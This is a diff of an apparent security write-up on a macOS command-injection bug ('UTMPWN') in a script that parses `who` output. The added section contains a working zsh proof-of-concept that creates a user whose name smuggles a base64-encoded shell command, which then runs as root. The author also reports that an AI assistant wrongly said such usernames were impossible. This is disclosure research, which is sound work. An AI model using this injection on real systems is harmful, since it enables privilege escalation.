@@ -111,7 +111,7 @@ foreach my $user (@users) {
 ```
 
 Claude realized there is a command injection opportunity here if the output of `who` has shell-escaping characters such as backticks, but since users on macOS can only be alphanumeric (with underscores and other uninteresting characters) - it could not be done.  
-I tried and indeed - `dscl` (nor the GUI) won't let me create usernames with backticks. Maybe in LDAP-controlled environment it could be done - but I did not have the environment to do so.  
+I tried and indeed - the OS seemed to not let me create usernames with backticks. Maybe in LDAP-controlled environment it could be done - but I did not have the environment to do so.  
 I decided then to see if I could affect the `who` utility in a different way - if the `who` utility indeed examines the users, I'd expect it to import `DirectoryService.framework`. Here's a comparison between `who` and `dscl`:
 
 ```
@@ -146,6 +146,27 @@ Indeed:
 ![UTMPWN](utmpwn.png)
 
 I've added the exploit [here](utmpwn.py).
+
+## Later discoveries
+Apparently, Claude was lying and it's quite easy to create weird user:
+
+```shell
+#!/bin/zsh
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`'
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' UserShell /bin/zsh
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' RealName "UTM PWN"
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' UniqueID 1337
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' PrimaryGroupID 20
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' NFSHomeDirectory /Users/Leet
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' password123
+mkdir /Users/Leet
+chown 'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' /Users/Leet
+login -f 'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`'
+```
+
+This simply works!  
+I also have done the experiment with an active directory server and LDAP, and was able to reproduce the same thing with LDAP.  
+This means this exploit might be "remotely triggerable" in *some* sense, but it's not really a remote code execution vulnerability.
 
 ## Summary
 There are some interesting takeaways from this vulnerability:
